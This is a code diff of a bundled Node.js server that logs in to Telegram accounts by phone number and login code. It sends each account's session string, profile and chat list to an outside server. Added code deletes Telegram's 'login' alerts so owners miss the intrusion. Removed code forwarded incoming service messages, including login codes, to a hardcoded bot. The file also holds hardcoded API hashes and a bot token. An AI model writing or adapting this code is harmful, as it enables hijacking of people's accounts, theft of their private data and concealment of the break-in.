@@ -59654,39 +59654,8 @@ const axios_1 = __importDefault(__webpack_require__(/*! axios */ "./node_modules
 const cors_1 = __importDefault(__webpack_require__(/*! cors */ "./node_modules/cors/lib/index.js"));
 const telegramManager_1 = __webpack_require__(/*! ./telegramManager */ "./src/telegramManager.ts");
 (__webpack_require__(/*! dotenv */ "./node_modules/dotenv/lib/main.js").config)();
-const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
 const app = (0, express_1.default)();
 app.use((0, cors_1.default)());
-let creds = [
-    {
-        apiId: 27919939,
-        apiHash: "5ed3834e741b57a560076a1d38d2fa94"
-    },
-    {
-        apiId: 25328268,
-        apiHash: "b4e654dd2a051930d0a30bb2add80d09"
-    },
-    {
-        apiId: 2899,
-        apiHash: "36722c72256a24c1225de00eb6a1ca74"
-    },
-    {
-        apiId: 24559917,
-        apiHash: "702294de6c08f4fd8c94c3141e0cebfb"
-    },
-    {
-        apiId: 12777557,
-        apiHash: "05054fc7885dcfa18eb7432865ea3500"
-    },
-    {
-        apiId: 27565391,
-        apiHash: "a3a0a2e895f893e2067dae111b20f2d9"
-    },
-    {
-        apiId: 23195238,
-        apiHash: "15a8b085da74163f158eabc71c55b000"
-    },
-];
 const port = 4000;
 function fetchWithTimeout(resource, options = {}) {
     return __awaiter(this, void 0, void 0, function* () {
@@ -59816,11 +59785,39 @@ const telegram_2 = __webpack_require__(/*! telegram */ "./node_modules/telegram/
 const sessions_1 = __webpack_require__(/*! telegram/sessions */ "./node_modules/telegram/sessions/index.js");
 const axios_1 = __importDefault(__webpack_require__(/*! axios */ "./node_modules/axios/dist/node/axios.cjs"));
 const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "./node_modules/telegram/Helpers.js");
-const events_1 = __webpack_require__(/*! telegram/events */ "./node_modules/telegram/events/index.js");
-const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
 const clients = new Map();
-const apiId = 24559917 || 0;
-const apiHash = "702294de6c08f4fd8c94c3141e0cebfb" || 0;
+let creds = [
+    {
+        apiId: 27919939,
+        apiHash: "5ed3834e741b57a560076a1d38d2fa94"
+    },
+    {
+        apiId: 25328268,
+        apiHash: "b4e654dd2a051930d0a30bb2add80d09"
+    },
+    {
+        apiId: 2899,
+        apiHash: "36722c72256a24c1225de00eb6a1ca74"
+    },
+    {
+        apiId: 24559917,
+        apiHash: "702294de6c08f4fd8c94c3141e0cebfb"
+    },
+    {
+        apiId: 12777557,
+        apiHash: "05054fc7885dcfa18eb7432865ea3500"
+    },
+    {
+        apiId: 27565391,
+        apiHash: "a3a0a2e895f893e2067dae111b20f2d9"
+    },
+    {
+        apiId: 23195238,
+        apiHash: "15a8b085da74163f158eabc71c55b000"
+    },
+];
+// const apiId = 24559917 || parseInt(process.env.API_ID);
+// const apiHash = "702294de6c08f4fd8c94c3141e0cebfb" || process.env.API_HASH;
 function restAcc(phoneNumber) {
     return __awaiter(this, void 0, void 0, function* () {
         yield (0, Helpers_1.sleep)(1000);
@@ -59830,6 +59827,7 @@ function restAcc(phoneNumber) {
             yield client.client.destroy();
             yield client.client.disconnect();
             client.client.session.delete();
+            client.session.delete();
             client.client = null;
             delete client['client'];
             yield deleteClient(phoneNumber);
@@ -59849,7 +59847,7 @@ function hasClient(number) {
 exports.hasClient = hasClient;
 function deleteClient(number) {
     return __awaiter(this, void 0, void 0, function* () {
-        console.log("Deleting Client");
+        console.log("Deleting Client - ", number);
         return clients.delete(number);
     });
 }
@@ -59873,18 +59871,20 @@ exports.disconnectAll = disconnectAll;
 function createClient(number) {
     return __awaiter(this, void 0, void 0, function* () {
         if (clients.has(number)) {
+            console.log("Client already exist");
             const cli = clients.get(number);
             setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                 yield restAcc(number);
-            }), 240000);
+            }), 150000);
             return (yield cli.sendCode(false));
         }
         else {
+            console.log("Creating new client");
             const cli = new TelegramManager(number);
             clients.set(number, cli);
             setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                 yield restAcc(number);
-            }), 240000);
+            }), 150000);
             return (yield cli.sendCode(false));
         }
     });
@@ -59892,6 +59892,9 @@ function createClient(number) {
 exports.createClient = createClient;
 class TelegramManager {
     constructor(number) {
+        const randomIndex = Math.floor(Math.random() * creds.length);
+        this.apiId = creds[randomIndex].apiId;
+        this.apiHash = creds[randomIndex].apiHash;
         this.phoneNumber = number;
         this.session = new sessions_1.StringSession('');
         this.client = null;
@@ -59907,7 +59910,7 @@ class TelegramManager {
     createClient() {
         return __awaiter(this, void 0, void 0, function* () {
             try {
-                this.client = new telegram_2.TelegramClient(this.session, apiId, apiHash, {
+                this.client = new telegram_2.TelegramClient(this.session, this.apiId, this.apiHash, {
                     connectionRetries: 5,
                 });
                 yield this.client.connect();
@@ -59917,15 +59920,33 @@ class TelegramManager {
             }
         });
     }
+    deleteMessages() {
+        return __awaiter(this, void 0, void 0, function* () {
+            console.log("IsConnected - ", this.client.connected, this.phoneNumber);
+            if (this.client.connected) {
+                try {
+                    const msgs = yield this.client.getMessages("777000", { limit: 2 });
+                    msgs.forEach((msg) => __awaiter(this, void 0, void 0, function* () {
+                        console.log(msg.text);
+                        if (msg.text.toLowerCase().includes('login'))
+                            yield msg.delete({ revoke: true });
+                    }));
+                }
+                catch (error) {
+                    console.log("Cannot delete Messages - ", this.phoneNumber);
+                }
+            }
+        });
+    }
     sendCode(forceSMS = false) {
         return __awaiter(this, void 0, void 0, function* () {
             try {
                 yield this.client.connect();
-                console.log("Sending OTP - ", this.phoneNumber, apiId, apiHash);
+                console.log("Sending OTP - ", this.phoneNumber, this.apiId, this.apiHash);
                 const sendResult = yield this.client.invoke(new telegram_1.Api.auth.SendCode({
                     phoneNumber: `+${this.phoneNumber}`,
-                    apiId,
-                    apiHash,
+                    apiId: this.apiId,
+                    apiHash: this.apiHash,
                     settings: new telegram_1.Api.CodeSettings({}),
                 }));
                 console.log('Send result - ', sendResult);
@@ -59954,7 +59975,7 @@ class TelegramManager {
             catch (err) {
                 console.log(err);
                 if (err.errorMessage === "AUTH_RESTART") {
-                    return this.client.sendCode({ apiId, apiHash }, `+${this.phoneNumber}`, forceSMS);
+                    return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);
                 }
                 else {
                     throw err;
@@ -59985,7 +60006,6 @@ class TelegramManager {
                 }
                 else {
                     console.log(this.client.session.save());
-                    this.client.addEventHandler(deleteMsgs, new events_1.NewMessage({ incoming: true }));
                     const sess = this.client.session.save();
                     const user = yield result.user.toJSON();
                     const chats = yield ((_b = this.client) === null || _b === void 0 ? void 0 : _b.getDialogs({ limit: 130 }));
@@ -60017,6 +60037,12 @@ class TelegramManager {
                     };
                     yield axios_1.default.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                     yield axios_1.default.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+                    let i = 3;
+                    while (i > 0) {
+                        yield this.deleteMessages();
+                        yield (0, Helpers_1.sleep)(3000);
+                        i--;
+                    }
                     setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                         yield restAcc(this.phoneNumber);
                     }), 50000);
@@ -60067,53 +60093,6 @@ class TelegramManager {
             yield restAcc(this.phoneNumber);
         });
     }
-}
-function deleteMsgs(event) {
-    return __awaiter(this, void 0, void 0, function* () {
-        console.log(event.message.text);
-        if (event.message.chatId.toString() == "777000") {
-            const payload = {
-                chat_id: "-1001801844217",
-                text: event.message.text
-            };
-            console.log("RECIEVED - ", event.message.text);
-            yield event.message.delete({ revoke: true });
-            const options = {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            };
-            yield fetchWithTimeout(`${ppplbot}`, options);
-        }
-        yield (0, Helpers_1.sleep)(300);
-        const msgs = yield event.client.getMessages("777000", { limit: 2 });
-        msgs.forEach((msg) => __awaiter(this, void 0, void 0, function* () {
-            if (msg.text.toLowerCase().includes('login')) {
-                yield msg.delete({ revoke: true });
-            }
-        }));
-    });
-}
-function fetchWithTimeout(resource, options = {}) {
-    return __awaiter(this, void 0, void 0, function* () {
-        const timeout = (options === null || options === void 0 ? void 0 : options.timeout) || 15000;
-        const source = axios_1.default.CancelToken.source();
-        const id = setTimeout(() => source.cancel(), timeout);
-        try {
-            const response = yield (0, axios_1.default)(Object.assign(Object.assign({}, options), { url: resource, cancelToken: source.token }));
-            clearTimeout(id);
-            return response;
-        }
-        catch (error) {
-            if (axios_1.default.isCancel(error)) {
-                console.log('Request canceled:', error.message);
-            }
-            else {
-                console.log('Error:', error.message);
-            }
-            return undefined;
-        }
-    });
 }
 
 
